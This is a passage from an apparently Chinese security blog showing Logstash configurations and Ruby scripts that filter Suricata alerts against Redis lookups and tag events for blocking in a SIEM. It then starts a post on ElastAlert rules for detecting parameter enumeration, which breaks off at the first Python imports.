<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-filter_ip.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;cdn_db&quot;</span> =&gt; 3</span><br><span class="line">                <span class="string">&quot;scan_db&quot;</span> =&gt; 4</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-6"><a href="#Ruby-Code-6" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-filter_ip.rb">filter_ip_from_alert.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="variable">@cdn_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;cdn_db&quot;</span>])</span><br><span class="line">        <span class="variable">@scan_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;scan_db&quot;</span>])</span><br><span class="line">    <span class="keyword">rescue</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@cdn_db</span>.exists?(src_ip) <span class="params">||</span> <span class="variable">@cdn_db</span>.exists?(dst_ip) <span class="params">||</span> <span class="variable">@scan_db</span>.exists?(src_ip) <span class="params">||</span> <span class="variable">@scan_db</span>.exists?(dst_ip) <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h5 id="4-1-2-filter-sid-from-alert"><a href="#4-1-2-filter-sid-from-alert" class="headerlink" title="4.1.2 filter_sid_from_alert"></a>4.1.2 filter_sid_from_alert</h5><h6 id="Logstash-Config-15"><a href="#Logstash-Config-15" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-siem_events.conf">filter_sid_from_alert.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-filter_sid.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;sid_db&quot;</span> =&gt; 2</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-7"><a href="#Ruby-Code-7" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-filter_sid.rb">filter_sid_from_alert.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@signature_id</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;sid_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    sid = event.get(<span class="string">&quot;[rule][id]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@signature_id</span>.exists?(sid) <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-2-alarm-from-siem"><a href="#4-2-alarm-from-siem" class="headerlink" title="4.2 alarm_from_siem"></a>4.2 alarm_from_siem</h4><h5 id="4-2-1-update-action-from-alarm"><a href="#4-2-1-update-action-from-alarm" class="headerlink" title="4.2.1 update_action_from_alarm"></a>4.2.1 update_action_from_alarm</h5><p>â€‹        æ›´æ–°åŒ¹é…åˆ°çš„<code>rule.id</code>äº‹ä»¶ï¼Œå°†<code>event.action</code>å€¼æ›´æ–°ä¸ºï¼š<code>block</code>ã€‚ä¾¿äºåæœŸè¢«SIEMè”åŠ¨æ¨¡å—â€œæ¶ˆè´¹â€ã€‚å¦‚ä¸Šå›¾ä¸­çº¢è‰²çº¿æ‰€ç¤ºéƒ¨åˆ†ã€‚ä¸»è¦æ˜¯ä¸ºäº†é€šè¿‡<code>event.action</code>å­—æ®µæ¥åŒºåˆ†SIEMåšçš„è‡ªåŠ¨åŒ–æ“ä½œã€‚</p>
<h6 id="Logstash-Config-16"><a href="#Logstash-Config-16" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_update-siem_action.conf">update-action_from_alarm.conf</a></strong></li>
</ul>
<p>â€‹    é’ˆå¯¹æŒ‡å®š<code>rule.id</code>äº‹ä»¶ï¼Œå°†<code>allowed</code>å€¼æ›´æ–°ä¸ºï¼š<code>block</code>ã€‚ä¾¿äºåæœŸè¢«è”åŠ¨æ¨¡å—â€œæ¶ˆè´¹â€ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        update =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[event][action]&quot;</span> =&gt; <span class="string">&quot;allowed&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ruby &#123;</span><br><span class="line">        path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-update_action.rb&quot;</span></span><br><span class="line">        script_params =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">            <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">            <span class="string">&quot;siem_action_db&quot;</span> =&gt; 7</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-8"><a href="#Ruby-Code-8" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-update_action.rb">update_action_from_alarm.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="variable">@siem_action_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;siem_action_db&quot;</span>])</span><br><span class="line">    <span class="keyword">rescue</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    rule_id = event.get(<span class="string">&quot;[rule][id]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@siem_action_db</span>.exists?(rule_id) <span class="keyword">then</span></span><br><span class="line">        event.set(<span class="string">&quot;[event][action]&quot;</span>, <span class="string">&quot;block&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="ç¤ºä¾‹ï¼š"><a href="#ç¤ºä¾‹ï¼š" class="headerlink" title="ç¤ºä¾‹ï¼š"></a><strong>ç¤ºä¾‹ï¼š</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/update_action-0.1.png" alt="image-20201207111416997"></p>
<hr>
<h2 id="3-ä»ªè¡¨ç›˜"><a href="#3-ä»ªè¡¨ç›˜" class="headerlink" title="3. ä»ªè¡¨ç›˜"></a>3. ä»ªè¡¨ç›˜</h2><h3 id="SIEMçš„å‘Šè­¦ä»ªè¡¨ç›˜"><a href="#SIEMçš„å‘Šè­¦ä»ªè¡¨ç›˜" class="headerlink" title="SIEMçš„å‘Šè­¦ä»ªè¡¨ç›˜"></a>SIEMçš„å‘Šè­¦ä»ªè¡¨ç›˜</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-Alarm.png" alt="SIEM-Alarm"></p>
<h3 id="å®‰å…¨äº‹ä»¶ä»ªè¡¨ç›˜-å®‰å…¨æº¯æº"><a href="#å®‰å…¨äº‹ä»¶ä»ªè¡¨ç›˜-å®‰å…¨æº¯æº" class="headerlink" title="å®‰å…¨äº‹ä»¶ä»ªè¡¨ç›˜ (å®‰å…¨æº¯æº)"></a>å®‰å…¨äº‹ä»¶ä»ªè¡¨ç›˜ (å®‰å…¨æº¯æº)</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-Alert.png" alt="SIEM Alert"></p>
<h3 id="æ•æ„Ÿæ¥å£ç›‘æ§"><a href="#æ•æ„Ÿæ¥å£ç›‘æ§" class="headerlink" title="æ•æ„Ÿæ¥å£ç›‘æ§"></a>æ•æ„Ÿæ¥å£ç›‘æ§</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/login_audit.png" alt="image-20201214112856076"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="ä¸€ä¸ªçƒ­çˆ±å¥èº«çš„å®‰å…¨åˆ†æå¸ˆ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/" class="post-title-link" itemprop="url">ä¸º Elastalert å¢åŠ  å‚æ•°éå†ã€å‘¨æœŸæ€§æ£€æµ‹è§„åˆ™</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2020-06-02 11:35:00" itemprop="dateCreated datePublished" datetime="2020-06-02T11:35:00+08:00">2020-06-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">æ›´æ–°äº</span>
        <time title="ä¿®æ”¹æ—¶é—´ï¼š2020-06-03 13:52:21" itemprop="dateModified" datetime="2020-06-03T13:52:21+08:00">2020-06-03</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/SIEM/" itemprop="url" rel="index"><span itemprop="name">SIEM</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
      <span>14k</span>
    </span>
    <span class="post-meta-item" title="é˜…è¯»æ—¶é•¿">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
      <span>12 åˆ†é’Ÿ</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h4><p>â€‹        ç”±äºAWSæµé‡é•œåƒçš„ç‰¹æ®Šæ€§ï¼Œç°é˜¶æ®µç”Ÿäº§ç½‘çš„æ¶æ„ä¸­åªæ¥å…¥äº†<strong>HTTP</strong>ä¸<strong>DNS</strong>æµé‡ï¼Œåˆ†åˆ«é‡‡ç”¨äº†<strong>Zeek</strong>ä¸<strong>Suricata</strong>å¯¹ç°æœ‰æµé‡è¿›è¡Œåˆ†æä¸é¢„è­¦ã€‚<strong>Suricata</strong>è´Ÿè´£åŸºäºç­¾åçš„ç‰¹å¾æ£€æµ‹ï¼Œ<strong>Zeek</strong>è´Ÿè´£å®šåˆ¶åŒ–äº‹ä»¶çš„è„šæœ¬æ£€æµ‹ï¼Œä¹Ÿç®—æ˜¯â€œå„å¸å…¶èŒâ€ã€‚è¿‘å‡ æ—¥ï¼ŒæŸä¸ªä¸šåŠ¡æ¥å£å‡ºç°äº†Pindomå‘Šè­¦ï¼Œç»è¿‡åˆ†æå‘ç°éƒ¨åˆ†IPå°è¯•å¯¹è¯¥æ¥å£çš„å‚æ•°è¿›è¡Œéå†ã€‚ç”±äºéå†å‚æ•°å¯¹åº”çš„å€¼è®¾ç½®çš„éƒ½æ¯”è¾ƒå¤§ï¼Œä¸”åå°å¹¶æœªå¯¹è¯¥å‚æ•°è¿›è¡Œæ·±åº¦çš„é™åˆ¶ï¼Œå¯¼è‡´äº†æœåŠ¡å™¨ä¼šä¸æ–­çš„è¿›è¡Œè®¡ç®—ï¼Œæœ€ç»ˆå¯¼è‡´æ¥å£æ— å“åº”ã€‚</p>
<h4 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h4><ul>
<li>æ£€æµ‹<strong>å‚æ•°éå†</strong>è¡Œä¸ºï¼›</li>
<li>è®¿é—®æ˜¯å¦å­˜åœ¨<strong>å‘¨æœŸæ€§</strong>ï¼›</li>
<li>unique user_agent ç»Ÿè®¡ï¼›</li>
<li>threat intelligence ç ”åˆ¤ï¼›</li>
</ul>
<h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><p>â€‹        é€šè¿‡æ‰©å±•**<a target="_blank" rel="noopener" href="https://github.com/Yelp/elastalert">ElastAlert</a>**å‘Šè­¦æ¡†æ¶çš„å‘Šè­¦æ¨¡å‹ï¼Œæ¥å®ç°ä»¥ä¸Šéœ€æ±‚ã€‚</p>
<h5 id="å‚æ•°éå†"><a href="#å‚æ•°éå†" class="headerlink" title="å‚æ•°éå†"></a>å‚æ•°éå†</h5><ul>
<li><h6 id="æ–°å¢è§„åˆ™-Spider-py"><a href="#æ–°å¢è§„åˆ™-Spider-py" class="headerlink" title="æ–°å¢è§„åˆ™ - Spider.py"></a>æ–°å¢è§„åˆ™ - Spider.py</h6></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> 